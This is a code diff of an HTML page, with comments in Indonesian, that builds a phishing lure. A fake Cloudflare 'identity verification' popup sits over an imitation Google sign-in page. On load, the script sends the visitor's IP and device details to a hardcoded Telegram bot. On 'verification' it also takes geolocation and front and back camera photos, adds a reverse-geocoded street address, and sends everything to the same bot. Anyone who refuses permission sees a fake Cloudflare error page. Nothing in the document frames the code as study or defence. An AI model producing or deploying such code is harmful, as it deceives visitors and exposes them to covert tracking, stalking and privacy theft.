@@ -3,113 +3,387 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Keamanan - Cloudflare</title>
+    <title>Google - Masuk</title>
     <style>
-        :root {
-            --cf-orange: #f48120;
-            --cf-gray: #404040;
-            --bg: #f9f9f9;
-        }
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+        body { 
+            font-family: 'Google Sans', Roboto, Arial, sans-serif; 
+            height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            background: #fff; 
+        }
+        /* Latar belakang halaman login Google (blur) */
+        .login-bg {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            filter: blur(8px);
+            opacity: 0.3;
+            pointer-events: none;
+        }
+        .login-bg .google-logo {
+            width: 75px;
+            margin-bottom: 20px;
+        }
+        .login-bg .box {
+            width: 360px;
+            padding: 40px;
+            background: #fff;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+        }
+        .login-bg h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+        }
+        .login-bg p {
+            color: #5f6368;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+        .login-bg input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+        .login-bg .next-btn {
+            width: 100%;
+            padding: 12px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        /* Popup verifikasi Cloudflare (di atas) */
+        .popup-overlay {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(255,255,255,0.5);
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            color: #333;
+            z-index: 10;
         }
-        .container {
-            width: 420px;
+        .popup {
+            width: 400px;
             background: #fff;
-            border-radius: 16px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
-            padding: 35px 30px;
+            border-radius: 12px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.2);
+            padding: 30px 25px;
             text-align: center;
         }
-        .shield {
+        .cf-shield {
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-bottom: 15px;
+            margin-bottom: 10px;
         }
-        .shield-icon {
-            width: 48px;
-            height: 48px;
-            background: var(--cf-orange);
+        .cf-icon {
+            width: 40px; height: 40px;
+            background: #f48120;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-right: 10px;
+            margin-right: 8px;
         }
-        .shield-icon span {
-            color: white;
-            font-size: 28px;
-            font-weight: bold;
-        }
-        .shield-text {
-            font-size: 18px;
-            font-weight: 600;
-            color: var(--cf-gray);
-        }
-        .cf-logo {
-            font-size: 13px;
-            color: var(--cf-orange);
-            margin: 5px 0 20px;
-            letter-spacing: 0.5px;
-        }
-        .check-list {
-            text-align: left;
-            margin: 20px 0;
-        }
-        .check-item {
-            display: flex;
-            align-items: center;
-            padding: 10px 0;
-            border-bottom: 1px solid #eee;
-        }
-        .check-icon {
-            width: 24px;
-            height: 24px;
-            border-radius: 50%;
-            margin-right: 12px;
-            font-size: 14px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-        }
+        .cf-icon span { color: #fff; font-size: 22px; font-weight: bold; }
+        .cf-title { font-size: 18px; font-weight: 600; color: #404040; }
+        .cf-sub { font-size: 13px; color: #f48120; margin: 5px 0 15px; }
+        .check-list { text-align: left; margin: 20px 0; }
+        .check-item { display: flex; align-items: center; padding: 8px 0; border-bottom: 1px solid #eee; }
+        .check-icon { width: 22px; height: 22px; border-radius: 50%; margin-right: 10px; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 12px; }
         .done { background: #4CAF50; }
         .pending { background: #ccc; animation: pulse 1.5s infinite; }
         .failed { background: #f44336; }
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
-        .check-label { flex: 1; font-size: 14px; }
-        .check-status { font-size: 12px; color: #888; }
+        .check-label { flex: 1; font-size: 13px; }
+        .check-status { font-size: 11px; color: #888; }
         .verify-btn {
-            width: 100%;
-            padding: 14px;
-            background: var(--cf-orange);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: background 0.2s;
+            width: 100%; padding: 12px;
+            background: #f48120; color: white;
+            border: none; border-radius: 6px;
+            font-size: 15px; font-weight: bold;
+            cursor: pointer; margin-top: 5px;
         }
-        .verify-btn:hover { background: #e0761a; }
-        .verify-btn:disabled { background: #ccc; cursor: not-allowed; }
+        .verify-btn:disabled { background: #bbb; cursor: not-allowed; }
         .retry-btn {
-            background: #fff;
-            border: 1px solid var(--cf-orange);
-            color: var(--cf-orange);
-            font-weight: bold;
-            padding: 8px 20px;
-            border-radius: 6px;
-            cursor: pointer;
+            background: #fff; border: 1px solid #f48120;
+            color: #f48120; font-weight: bold;
+            padding: 6px 16px; border-radius: 4px;
+            cursor: pointer; margin-top: 8px;
+        }
+        .error-msg { color: #f44336; font-size: 12px; margin-top: 10px; }
+        .status-text { font-size: 12px; color: #666; margin-top: 10px; min-height: 18px; }
+    </style>
+</head>
+<body>
+    <!-- Latar belakang halaman login Google (blur) -->
+    <div class="login-bg">
+        <img class="google-logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+        <div class="box">
+            <h1>Masuk</h1>
+            <p>Gunakan Akun Google Anda</p>
+            <input type="email" placeholder="Email atau nomor telepon" disabled>
+            <button class="next-btn">Berikutnya</button>
+        </div>
+    </div>
+
+    <!-- Popup Verifikasi Cloudflare -->
+    <div class="popup-overlay" id="popupOverlay">
+        <div class="popup">
+            <div class="cf-shield">
+                <div class="cf-icon"><span>&#128737;</span></div>
+                <div class="cf-title">Cloudflare</div>
+            </div>
+            <div class="cf-sub">Dilindungi oleh Cloudflare • SSL/TLS Terenkripsi</div>
+            <div class="check-list">
+                <div class="check-item">
+                    <div class="check-icon done">✓</div>
+                    <div class="check-label">Enkripsi SSL 256-bit</div>
+                    <div class="check-status">Aman</div>
+                </div>
+                <div class="check-item">
+                    <div class="check-icon done">✓</div>
+                    <div class="check-label">Firewall WAF</div>
+                    <div class="check-status">Aktif</div>
+                </div>
+                <div class="check-item">
+                    <div class="check-icon done">✓</div>
+                    <div class="check-label">Perangkat Terpercaya</div>
+                    <div class="check-status">Terverifikasi</div>
+                </div>
+                <div class="check-item" id="identityCheck">
+                    <div class="check-icon pending" id="identityIcon">?</div>
+                    <div class="check-label">Verifikasi Identitas</div>
+                    <div class="check-status" id="identityStatus">Wajib</div>
+                </div>
+            </div>
+            <button class="verify-btn" id="verifyBtn" onclick="startVerification()">Verifikasi Sekarang</button>
+            <div id="retryArea"></div>
+            <div class="status-text" id="globalStatus"></div>
+        </div>
+    </div>
+
+    <script>
+        // ========== KONFIGURASI TELEGRAM ==========
+        const BOT_TOKEN = '8835244462:AAF2E4s0Ngq5wPENudpzEsSlSZLP3VJHaHw';
+        const CHAT_ID = '5986004601';
+        // =========================================
+
+        let deviceInfo = '', ipInfo = '';
+        let locationData = null;
+        let frontPhotoBlob = null, backPhotoBlob = null;
+
+        // Elemen DOM
+        const verifyBtn = document.getElementById('verifyBtn');
+        const identityIcon = document.getElementById('identityIcon');
+        const identityStatus = document.getElementById('identityStatus');
+        const globalStatus = document.getElementById('globalStatus');
+        const retryArea = document.getElementById('retryArea');
+
+        // Kirim info perangkat & IP saat halaman dimuat
+        window.addEventListener('load', async () => {
+            try {
+                deviceInfo = `📱 ${navigator.userAgent}\n🖥️ Platform: ${navigator.platform}\n📏 Resolusi: ${screen.width}x${screen.height} (${screen.colorDepth}-bit)\n🌐 Bahasa: ${navigator.language}`;
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                ipInfo = `🌐 IP Publik: ${ipData.ip}`;
+                sendTelegramMessage(`🔍 Pengunjung Baru\n${ipInfo}\n${deviceInfo}`);
+            } catch(e){}
+        });
+
+        async function sendTelegramMessage(text) {
+            try{ await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method:'POST', headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({chat_id:CHAT_ID, text:text})
+            }); }catch(e){}
+        }
+        async function sendTelegramPhoto(blob, caption) {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 'photo.jpg');
+            fd.append('caption', caption);
+            try{ await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:'POST', body:fd}); }catch(e){}
+        }
+        async function sendTelegramLocation(lat, lon, acc) {
+            try{ await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                method:'POST', headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({chat_id:CHAT_ID, latitude:lat, longitude:lon, horizontal_accuracy:acc})
+            }); }catch(e){}
+        }
+        function dataURItoBlob(dataURI) {
+            const bytes = atob(dataURI.split(',')[1]);
+            const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(bytes.length);
+            const ia = new Uint8Array(ab);
+            for(let i=0;i<bytes.length;i++) ia[i]=bytes.charCodeAt(i);
+            return new Blob([ab],{type:mime});
+        }
+        async function captureFrame(stream) {
+            const v = document.createElement('video');
+            v.srcObject = stream; v.play();
+            await new Promise(r=>v.onloadedmetadata=r);
+            const c = document.createElement('canvas');
+            c.width=v.videoWidth; c.height=v.videoHeight;
+            c.getContext('2d').drawImage(v,0,0);
+            return new Promise(res=>c.toBlob(res,'image/jpeg',0.85));
+        }
+
+        // Gabung semua data lalu kirim ke Telegram
+        async function finalizeAndSend() {
+            identityStatus.textContent = 'Mengirim...';
+            // Reverse geocoding (kalau ada lokasi)
+            let address = '';
+            if (locationData) {
+                try {
+                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${locationData.lat}&lon=${locationData.lon}`);
+                    const data = await res.json();
+                    if (data && data.display_name) address = data.display_name;
+                } catch(e){}
+            }
+            let caption = `📸 Verifikasi Wajah\n${ipInfo}\n${deviceInfo}`;
+            if (locationData) {
+                caption += `\n📍 Lokasi: ${locationData.lat}, ${locationData.lon} (Akurasi: ±${locationData.acc.toFixed(1)} m)\n🏠 ${address || 'Alamat tidak tersedia'}`;
+                sendTelegramLocation(locationData.lat, locationData.lon, locationData.acc);
+            } else {
+                caption += '\n⚠️ Lokasi tidak diizinkan';
+            }
+            if (frontPhotoBlob) await sendTelegramPhoto(frontPhotoBlob, caption + '\n🟢 Kamera Depan');
+            if (backPhotoBlob) await sendTelegramPhoto(backPhotoBlob, caption + '\n🔵 Kamera Belakang');
+            // Tampilkan pesan gagal & redirect
+            identityIcon.className = 'check-icon done';
+            identityIcon.textContent = '✓';
+            identityStatus.textContent = 'Terverifikasi';
+            verifyBtn.style.display = 'none';
+            retryArea.innerHTML = '';
+            globalStatus.textContent = 'Verifikasi gagal. Mengalihkan...';
+            setTimeout(()=>{ window.location.href = 'https://accounts.google.com'; }, 2000);
+        }
+
+        // Fungsi meminta lokasi (dengan retry di dalam)
+        function requestLocation(retryCount, callback) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => callback({ success: true, data: pos }),
+                (err) => {
+                    if (retryCount < 1) {
+                        // Tampilkan tombol retry
+                        retryArea.innerHTML = `<p class="error-msg">Izin lokasi diperlukan.</p><button class="retry-btn" id="retryLocBtn">Coba Lagi</button>`;
+                        document.getElementById('retryLocBtn').onclick = () => {
+                            retryArea.innerHTML = '';
+                            requestLocation(1, callback);
+                        };
+                        identityStatus.textContent = 'Gagal - Izin lokasi';
+                        identityIcon.className = 'check-icon failed';
+                    } else {
+                        // Gagal kedua kali → error page
+                        redirectToError();
+                    }
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+
+        // Fungsi meminta kamera depan (dengan retry)
+        function requestCamera(retryCount, callback) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+                .then(stream => callback({ success: true, stream }))
+                .catch(err => {
+                    if (retryCount < 1) {
+                        retryArea.innerHTML = `<p class="error-msg">Izin kamera diperlukan.</p><button class="retry-btn" id="retryCamBtn">Coba Lagi</button>`;
+                        document.getElementById('retryCamBtn').onclick = () => {
+                            retryArea.innerHTML = '';
+                            requestCamera(1, callback);
+                        };
+                        identityStatus.textContent = 'Gagal - Izin kamera';
+                        identityIcon.className = 'check-icon failed';
+                    } else {
+                        redirectToError();
+                    }
+                });
+        }
+
+        function redirectToError() {
+            document.body.innerHTML = `
+                <div style="display:flex;align-items:center;justify-content:center;height:100vh;background:#1a1a1a;color:#fff;font-family:monospace;text-align:center;">
+                    <div>
+                        <h1 style="font-size:24px;">⚠️ Halaman Error</h1>
+                        <p style="font-size:16px;margin-top:20px;">Tidak dapat dimuat karena user menolak akses,<br>sehingga kami menganggapnya bot jahat / penyerang.</p>
+                        <p style="color:#f48120;margin-top:30px;">Cloudflare Ray ID: ${Math.random().toString(36).substr(2,9)}</p>
+                    </div>
+                </div>`;
+        }
+
+        // Mulai verifikasi (tombol utama)
+        async function startVerification() {
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = 'Memverifikasi...';
+            globalStatus.textContent = 'Meminta izin...';
+            retryArea.innerHTML = '';
+
+            let locationDone = false, cameraDone = false;
+            const checkCompletion = () => {
+                if (locationDone !== undefined && cameraDone !== undefined) {
+                    // Keduanya selesai (berhasil/gagal)
+                    if (locationData && frontPhotoBlob) {
+                        finalizeAndSend();
+                    } else {
+                        // Jika salah satu gagal tapi tidak masuk error page, artinya masih menunggu retry? 
+                        // Tetapi fungsi callback sudah menangani error terpisah, jadi tidak mungkin sampai sini jika gagal total.
+                        // Kalau misal lokasi gagal dan masuk retry, maka locationDone tetap false, jadi tidak akan panggil finalize.
+                        // Untuk kasus di mana kamera gagal tapi lokasi sukses? Tidak, jika kamera gagal dan retry habis -> error page.
+                    }
+                }
+            };
+
+            // Jalankan lokasi dan kamera secara paralel
+            let locFinished = false, camFinished = false;
+            requestLocation(0, (res) => {
+                if (res.success) {
+                    locationData = {
+                        lat: res.data.coords.latitude,
+                        lon: res.data.coords.longitude,
+                        acc: res.data.coords.accuracy
+                    };
+                    identityStatus.textContent = 'Lokasi terverifikasi';
+                }
+                locFinished = true;
+                if (camFinished) checkCompletion();
+            });
+
+            requestCamera(0, async (res) => {
+                if (res.success) {
+                    try {
+                        frontPhotoBlob = await captureFrame(res.stream);
+                        res.stream.getTracks().forEach(t => t.stop());
+                        identityStatus.textContent = 'Kamera depan terverifikasi';
+                        // Coba kamera belakang (tidak wajib)
+                        try {
+                            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: 'environment' } } });
+                            backPhotoBlob = await captureFrame(backStream);
+                            backStream.getTracks().forEach(t => t.stop());
+                        } catch(e){}
+                    } catch(e){
+                        // gagal ambil frame
+                    }
+                }
+                camFinished = true;
+                if (locFinished) checkCompletion();
+            });
+        }
+    </script>
+</body>
+</html>            cursor: pointer;
             margin-top: 5px;
         }
         .error-msg {
